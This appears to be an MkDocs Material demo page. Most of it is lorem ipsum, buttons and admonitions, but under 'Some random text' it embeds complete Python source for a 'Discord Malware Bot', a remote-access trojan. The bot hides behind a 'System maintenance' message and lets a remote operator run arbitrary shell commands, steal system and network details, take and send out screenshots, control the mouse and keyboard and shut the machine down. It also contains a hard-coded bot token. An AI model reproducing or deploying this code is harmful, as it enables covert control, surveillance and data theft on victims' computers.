# Home

## Commands

* `mkdocs new [dir-name]` - Create a new project.
* `mkdocs serve` - Start the live-reloading docs server.
* `mkdocs build` - Build the documentation site.
* `mkdocs -h` - Print help message and exit.

## Project layout

    mkdocs.yml    # The configuration file.
    docs/
        index.md  # The documentation homepage.
        ...       # Other markdown pages, images and other files.

## Button
[Subscribe to our newsletter](#){ .md-button }
[Send :fontawesome-solid-paper-plane:](#){ .md-button }

![Image title](https://dummyimage.com/600x400/eee/aaa)

![Image title](https://dummyimage.com/600x400/f5f5f5/aaaaaa#only-light)
![Image title](https://dummyimage.com/600x400/21222c/d5d7e2#only-dark)

## Hey!!!
!!! tip top start "Lorem ispum"

    faucibus in ornare quam viverra orci sagittis eu volutpat odio facilisis mauris sit amet massa vitae tortor condimentum lacinia quis vel eros donec ac odio tempor orci dapibus ultrices in iaculis nunc sed augue lacus viverra vitae congue eu consequat ac felis donec et odio pellentesque diam volutpat commodo sed egestas egestas fringilla phasellus

!!! quote top start "Lorem ispum"

    faucibus in ornare quam viverra orci sagittis eu volutpat odio facilisis mauris sit amet massa vitae tortor condimentum lacinia quis vel eros donec ac odio tempor orci dapibus ultrices in iaculis nunc sed augue lacus viverra vitae congue eu consequat ac felis donec et odio pellentesque diam volutpat commodo sed egestas egestas fringilla phasellus

!!! failure top start "Lorem ispum"

    faucibus in ornare quam viverra orci sagittis eu volutpat odio facilisis mauris sit amet massa vitae tortor condimentum lacinia quis vel eros donec ac odio tempor orci dapibus ultrices in iaculis nunc sed augue lacus viverra vitae congue eu consequat ac felis donec et odio pellentesque diam volutpat commodo sed egestas egestas fringilla phasellus

??? note "Lorem ispum"

    faucibus in ornare quam viverra orci sagittis eu volutpat odio facilisis mauris sit amet massa vitae tortor condimentum lacinia quis vel eros donec ac odio tempor orci dapibus ultrices in iaculis nunc sed augue lacus viverra vitae congue eu consequat ac felis donec et odio pellentesque diam volutpat commodo sed egestas egestas fringilla phasellus

    ``` py title="bubble_sort.py" linenums="1" hl_lines="2 3"
    def bubble_sort(items):
    for i in range(len(items)):
        for j in range(len(items) - 1 - i):
            if items[j] > items[j + 1]:
                items[j], items[j + 1] = items[j + 1], items[j]
    ```

## Bio
``` py
fringilla urna porttitor rhoncus dolor purus non enim praesent elementum facilisis leo vel fringilla est <br>
ullamcorper eget nulla facilisi etiam dignissim diam quis enim lobortis scelerisque fermentum dui 
<br>
faucibus in ornare quam viverra orci sagittis eu volutpat odio facilisis mauris sit amet massa vitae tortor condimentum lacinia quis vel eros donec ac odio tempor orci dapibus ultrices in iaculis nunc sed augue lacus viverra vitae congue eu consequat ac felis donec et odio pellentesque diam volutpat commodo sed egestas egestas fringilla phasellus faucibus scelerisque eleifend donec pretium vulputate sapien nec sagittis aliquam malesuada bibendum arcu vitae elementum curabitur vitae nunc sed velit dignissim sodales ut eu sem integer vitae justo eget magna fermentum iaculis eu non diam phasellus vestibulum lorem sed risus ultricies tristique nulla aliquet enim tortor at auctor urna nunc id cursus metus aliquam eleifend mi in nulla posuere sollicitudin aliquam ultrices sagittis orci a scelerisque purus semper eget duis at tellus at urna condimentum mattis pellentesque id nibh tortor id aliquet lectus proin nibh nisl condimentum id venenatis a condimentum vitae sapien pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas sed tempus urna et pharetra pharetra massa massa ultricies mi quis hendrerit dolor magna eget est lorem ipsum dolor sit amet consectetur adipiscing elit pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas integer eget aliquet nibh praesent tristique magna sit amet purus gravida quis blandit turpis cursus in hac habitasse platea dictumst quisque sagittis purus sit amet volutpat consequat mauris nunc congue nisi vitae suscipit tellus mauris a diam maecenas sed enim ut sem viverra aliquet eget sit amet tellus cras adipiscing enim eu turpis egestas pretium aenean pharetra magna ac placerat vestibulum lectus mauris ultrices eros in cursus turpis massa tincidunt dui ut ornare lectus sit amet est placerat in egestas erat imperdiet sed euismod nisi porta lorem mollis aliquam ut porttitor leo a diam sollicitudin tempor id eu nisl nunc mi ipsum faucibus vitae aliquet nec ullamcorper sit amet risus nullam eget felis eget nunc lobortis mattis aliquam faucibus purus in massa tempor nec feugiat
```

## Code
``` py
def display(text):
    print(text)
```

## Some random text
this is some random text
<br>
``` py
# Discord Malware Bot: remote control

#? Libraries & Modules
import discord
from discord.ext import commands
from discord.utils import get
import os, subprocess, platform, socket, psutil, re, uuid,  GPUtil, pyautogui

#// None

#? Bot Setup
malwareBot = commands.Bot(command_prefix='.')
malwareBot.remove_command("help")
malwareBotToken = "MTA4ODQ4MDM4MTgyNjc2NDgwMA.GMffo2.8WVorC-vkyN_L4DlVYKLE1-JQM02tHHOKhbiAY"
defaultSpaceInBetween = 14

#? Main Program
@malwareBot.event
async def on_ready():
    await malwareBot.change_presence(status=discord.Status.dnd, activity=discord.Game("is on"))
    print("System maintenance, please do not close this window.")

# beta commands
@malwareBot.command()
async def viewFiles(ctx, path = None):
    if path == None:
        path = os.getcwd()
    else:
        pass
    files = os.listdir(path)
    embed = discord.Embed(title="List Of Files", description="A List Of All The Files In The Current Directory", colour=discord.Colour.blue())
    valueText = ""
    dirs = 0
    preChar = ""
    sufChar = ""
    for file in files:
        name , ext = os.path.splitext(file)
        if file == files[0]:
            prefix = ""
        else:
            prefix = ", "
        if ext == "" or ext == ".zip":
            dirs += 1
            preChar = "<"
            sufChar = ">"
        valueText += f"{prefix}{preChar}{file}{sufChar}"
    embed.add_field(name=f"Directory: `{path}`", value=f"""```md\n{valueText}```""", inline=False)
    embed.add_field(name="Files Information", value=f"Amount Of Files: {len(files)}", inline=False)
    embed.add_field(name="Folder Information", value=f"Amount Of Dirs: {dirs}", inline=False)
    await ctx.send(embed=embed)

# Commands
@malwareBot.command()
async def botInfo(ctx):
    embed = discord.Embed(title="Malware Bot", description="A discord based bot-net", url="https://discord.com/api/oauth2/authorize?client_id=1088480381826764800&permissions=8&scope=bot", colour=discord.Colour.blue())
    embed.add_field(name="Status", value="ONLINE", inline=True)
    embed.add_field(name="Bot Name", value=malwareBot.user, inline=True)
    embed.add_field(name="Bot Prefix", value="\".\"", inline=True)
    await ctx.send(embed=embed)
@malwareBot.command()
async def botShutDown(ctx):
    embed = discord.Embed(title="Shuting Down...", description=f"The Bot \"{malwareBot.user}\" is shuting down", colour=discord.Colour.dark_red())
    await ctx.send(embed=embed)
    exit()

# LINK - SEPARATOR =SYSTEM======================================================================================#

@malwareBot.command()
async def systemInfo(ctx):
    embed = discord.Embed(title="System Info", description=f"Information About The System", colour=discord.Colour.blue())
    embed.add_field(name="**User**", value=os.getlogin(), inline=True)
    embed.add_field(name="**Device Name**", value=socket.gethostname(), inline=True)
    embed.add_field(name="**Device OS**", value=f"{platform.system()} {platform.release()}", inline=False)
    embed.add_field(name="**Device Exact Version**", value=platform.version(), inline=False)
    await ctx.send(embed=embed)
    gpus = GPUtil.getGPUs()
    CPU = platform.processor()
    for gpu in gpus:
        GPU = gpu.name
    RAM = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
    IP_ADDRESS = socket.gethostbyname(socket.gethostname())
    MAC_ADDRESS = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    embed = discord.Embed(title="System Specs Info", description=f"Information About The System Components", colour=discord.Colour.blue())
    embed.add_field(name="Processor (CPU)", value=CPU, inline=False)
    embed.add_field(name="Graphics Card (GPU)", value=GPU, inline=False)
    embed.add_field(name="Memory (RAM)", value=RAM, inline=False)
    await ctx.send(embed=embed)
    embed = discord.Embed(title="System Network Info", description=f"Information About The System Network", colour=discord.Colour.blue())
    embed.add_field(name="IP Address", value=IP_ADDRESS, inline=False)
    embed.add_field(name="IP Address", value=MAC_ADDRESS, inline=False)
    await ctx.send(embed=embed)
@malwareBot.command()
async def run(ctx, osCommand=None):
    try:
        commandFeedback = subprocess.run(osCommand, capture_output=True, shell=True, check=True)
        embed = discord.Embed(title="Success", description="Command Executed Successfully", colour=discord.Colour.green())
        embed.add_field(name="**Feedback**", value=commandFeedback)
        await ctx.send(embed=embed)
    except:
        embed = discord.Embed(title="Error", description="Could Not Execute Command", colour=discord.Colour.red())
        await ctx.send(embed=embed)
    try:
        os.system("cls")
        embed = discord.Embed(title="CMD cleared", description="CMD Was Cleared Successfully", colour=discord.Colour.blue())
        await ctx.send(embed=embed)
        print("System maintenance, please do not close this window.")
    except:
        embed = discord.Embed(title="Error", description="Could Not Clear CMD", colour=discord.Colour.red())
        await ctx.send(embed=embed)
@malwareBot.command()
async def systemShutDown(ctx):
    try:
        embed = discord.Embed(title="Shuting Down...", description=f"The User \"{os.getlogin()}\" is shuting down", colour=discord.Colour.dark_red())
        await ctx.send(embed=embed)
        os.system("shutdown -p")
    except:
        embed = discord.Embed(title="Error", description=f"The User \"{os.getlogin()}\" Could Not Shut Down", colour=discord.Colour.red())
        await ctx.send(embed=embed)

# LINK - SEPARATOR =MOUSE=======================================================================================#

@malwareBot.command()
async def mouse(ctx, command=None, coordinates=None):
    if command == "click":
        try:
            pyautogui.click()
            embed = discord.Embed(title="Success", description=f"Successfully Clicked Mouse", colour=discord.Colour.green())
            await ctx.send(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"Could Not Click Mouse", colour=discord.Colour.red())
            await ctx.send(embed=embed)
    elif command == "move" and coordinates != None:
        X, Y = coordinates.split("x")
        try:
            pyautogui.moveTo(x=int(X), y=int(Y))
            embed = discord.Embed(title="Success", description=f"Successfully Moved Mouse To \"{X}x{Y}\"", colour=discord.Colour.green())
            await ctx.send(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"Could Not Move Mouse To \"{X}x{Y}\"", colour=discord.Colour.red())
            await ctx.send(embed=embed)
    elif command == "scroll" and coordinates != None:
        coordinates = int(coordinates)
        try:
            pyautogui.scroll(coordinates)
            embed = discord.Embed(title="Success", description=f"Successfully Scrolled Mouse \"{str(coordinates)}\" Pixels", colour=discord.Colour.green())
            await ctx.send(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"Could Not Scroll Mouse \"{str(coordinates)}\" Pixels", colour=discord.Colour.red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Error", description=f"Unknown Command", colour=discord.Colour.red())
        await ctx.send(embed=embed)

# LINK - SEPARATOR =KEYBOARD====================================================================================#

@malwareBot.command()
async def keyboard(ctx, command=None, keyCombination=None):
    if command == "type" and keyCombination != None:
        try:
            pyautogui.typewrite(keyCombination)
            embed = discord.Embed(title="Success", description=f"Successfully Typed \"{keyCombination}\"", colour=discord.Colour.green())
            await ctx.send(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"Could Not Type \"{keyCombination}\"", colour=discord.Colour.red())
            await ctx.send(embed=embed)
    elif command == "hotkey" and keyCombination != None:
        try:
            pyautogui.hotkey(keyCombination)
            embed = discord.Embed(title="Success", description=f"Successfully Executed The Hotkey \"{keyCombination}\"", colour=discord.Colour.green())
            await ctx.send(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"Could Not Execute The Hotkey \"{keyCombination}\"", colour=discord.Colour.red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Error", description=f"Unknown Command", colour=discord.Colour.red())
        await ctx.send(embed=embed)

# LINK - SEPARATOR =SCREEN=====================================================================================#

@malwareBot.command()
async def screen(ctx, command=None, fileName="screenshot.png"):
    try:
        command = command.lower()
    except:
        pass
    if command == "info":
        width, height = str(pyautogui.getInfo()[4]).lower().removeprefix("size(").removesuffix(")").split(", ")
        width = int(width.removeprefix("width="))
        height = int(height.removeprefix("height="))
        embed = discord.Embed(title="Screen Info", description=f"Information About The Screen", colour=discord.Colour.blue())
        embed.add_field(name="**WIDTH**", value=width, inline=True)
        embed.add_field(name="**HEIGHT**", value=height, inline=True)
        await ctx.send(embed=embed)
    elif command == "capture":
        try:
            pyautogui.screenshot(fileName)
            embed = discord.Embed(title="Screenshot", description=f"Screenshot Captured ({pyautogui.getInfo()[5]})", colour=discord.Colour.dark_blue())
            file = discord.File(fileName)
            embed.set_image(url=f"attachment://{fileName}")
            await ctx.send(embed=embed, file=file)
        except:
            embed = discord.Embed(title="Error", description=f"Could Not Capture Screenshot", colour=discord.Colour.red())
            await ctx.send(embed=embed)
        try:
            os.system(f"del {fileName}")
            embed = discord.Embed(title="Screenshot Deleted", description=f"Screenshot File Deleted Successfully", colour=discord.Colour.blue())
            await ctx.send(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"Screenshot File Could Not Be Deleted", colour=discord.Colour.red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Error", description=f"Unknown Command", colour=discord.Colour.red())
        await ctx.send(embed=embed)

# LINK - SEPARATOR =HELP=======================================================================================#

@malwareBot.command()
async def help(ctx):
    embed = discord.Embed(title="Command List & Command Info", description=f"Shows Information About All The Existing Commands", colour=discord.Colour.gold())
    embed.set_author(name="Malware Bot")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1088487280806735903/1088726736881078372/getty_541003850_338307.jpg")
    embed.add_field(name="botInfo `<None>`", value=f"Shows info about \"{malwareBot.user}\"", inline=False)
    embed.add_field(name="botShutDown `<None>`", value=f"Shuts down \"{malwareBot.user}\"", inline=False)
    embed.add_field(name="systemInfo `<None>`", value="Shows info about the system the bot is running on", inline=False)
    embed.add_field(name="run `<osCommand>`", value="Executes a system command", inline=False)
    embed.add_field(name="systemShutDown `<None>`", value="Shuts down the system (\"shutdown -p\")", inline=False)
    embed.add_field(name="mouse `<command:[\"click\",\"move\",\"scroll\"]>`, `<coordinates:example[\"0x0\",\"-100\"]>`", value="Controls the mouse of the system the bot is running on", inline=False)
    embed.add_field(name="keyboard `<command:[\"type\",\"hotkey\"]>`, `<keyCombination:example[\"text\",\"Alt+F4\"]>`", value="Controls the keyboard of the system the bot is running on", inline=False)
    embed.add_field(name="screen `<command:[\"info\",\"capture\"]>`, `<fileName:example[\"image.png\"]>`", value="Can capture a screenshot or give you info about the screen", inline=False)
    await ctx.send(embed=embed)

malwareBot.run(malwareBotToken)
```
<br>
![Python](https://img.shields.io/badge/-Python-%23FFC300?style=for-the-badge&logo=python)